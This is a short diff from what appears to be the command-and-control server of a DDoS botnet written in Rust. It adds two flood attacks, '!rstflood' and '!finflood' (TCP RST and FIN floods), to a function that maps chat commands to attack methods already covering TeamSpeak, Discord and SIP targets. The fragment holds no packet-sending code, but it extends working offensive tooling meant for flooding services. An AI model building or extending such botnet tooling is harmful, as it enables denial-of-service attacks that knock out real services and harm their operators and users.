@@ -106,6 +106,8 @@ pub fn validate_attack_method(method: &str) -> Result<String> {
         "!ts3" | "!teamspeak" => "TS3",
         "!discord" => "DISCORD",
         "!sip" => "SIP",
+        "!rstflood" => "RST",
+        "!finflood" => "FIN",
         _ => {
             return Err(CncError::InvalidCommand(
                 format!("Unknown attack method: {}. Type 'methods' to see available methods", method)
